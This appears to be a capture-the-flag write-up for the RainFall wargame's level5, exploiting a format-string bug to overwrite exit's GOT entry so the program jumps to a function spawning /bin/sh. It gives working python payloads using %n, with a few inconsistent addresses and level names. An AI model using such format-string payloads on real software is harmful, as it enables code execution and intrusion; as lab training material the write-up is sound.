```
evel5@localhost's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

Again, we get the fgets + printf combo
There is a call to system /bin/sh, but the function is never called.

The technique we used previously, that was all about return pointer override, cannot be used now since the normal code path ends on an exit.

ltrace, and all others calls visible from ltrace, are function calls outside of the binary, only the pointer to this code is in ours.

So as long as we still have our printf exploit, we should be able to write at the address storing the pointer

It seems to be at 0x08049838, both findable with ghidra or objdump -R

Instead of calling exit, we would like to call the o function, its address is 0x080484a4

0x08049838
0x080484a4 or 134513828 in decimal 
We want to write \xa4\x84\x04\x08 at \x28\x98\x04\x08

```
level4@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "%134513824d%12$n")'| ./level4
```

But first lets find our input string index

```
./level5 
AAAA%x AAAA%x AAAA%x AAAA%x AAAA%x AAAA%x AAAA%x AAAA%x AAAA%x AAAA%x AAAA%x AAAA%x
AAAA200 AAAAb7fd1ac0 AAAAb7ff37d0 AAAA41414141 AAAA41207825 AAAA25414141 AAAA41412078 AAAA78254141 AAAA41414120 AAAA20782541 AAAA41414141 AAAA41207825
```

it's index number 4 so 
```
level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")'| ./level5
```